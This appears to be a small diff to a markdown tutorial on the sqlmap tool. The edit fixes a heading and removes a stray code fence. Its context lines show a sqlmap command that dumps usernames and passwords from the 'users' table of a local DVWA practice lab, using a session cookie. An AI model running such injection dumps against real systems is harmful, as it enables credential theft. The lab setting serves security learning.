@@ -1,4 +1,4 @@
-x# sqlmap
+## sqlmap
 
 ## home page:
 http://sqlmap.org/
@@ -50,7 +50,6 @@ sqlmap shows that the url is injectable and after several tests we use the comma
 ```
 python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#"   
 --cookie="security=medium;PHPSESSID=ohkmhftad408oltet5pbe57se7"--batch -D dvwa -T users -C user,password --dump
-``
 
 
 
